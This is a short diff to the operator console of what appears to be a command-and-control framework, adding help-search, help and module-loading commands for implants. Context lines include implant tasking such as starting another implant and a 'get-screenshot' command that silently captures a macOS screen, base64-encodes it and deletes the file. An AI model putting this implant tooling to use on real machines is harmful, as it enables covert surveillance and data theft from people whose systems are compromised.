@@ -371,6 +371,14 @@ def runcommand(command, randomuri):
       update_sleep(command, randomuri)
       new_task(sleep, randomuri)
 
+    elif "searchhelp" in command.lower():
+      searchterm = (command.lower()).replace("searchhelp ","")
+      import string
+      helpfull = string.split(py_help1, '\n')
+      for line in helpfull:
+        if searchterm in line:
+          print line
+          
     elif command.lower() == 'sai' or command.lower() == 'sai ':
       new_task('startanotherimplant', randomuri)
 
@@ -393,6 +401,19 @@ def runcommand(command, randomuri):
       except Exception as e:
         print "Error with source file: %s" % e   
         traceback.print_exc()  
+
+    elif command.lower() == "help" or command == "?" or command.lower() == "help ":
+      print py_help1
+
+    elif "loadmoduleforce" in command.lower():
+      params = re.compile("loadmoduleforce ", re.IGNORECASE)
+      params = params.sub("", command)
+      check_module_loaded(params, randomuri, force=True)
+
+    elif "loadmodule" in command.lower():
+      params = re.compile("loadmodule ", re.IGNORECASE)
+      params = params.sub("", command)
+      check_module_loaded(params, randomuri)
 
     elif 'get-screenshot' in command.lower():
       taskcmd = "screencapture -x /tmp/s;base64 /tmp/s;rm /tmp/s"
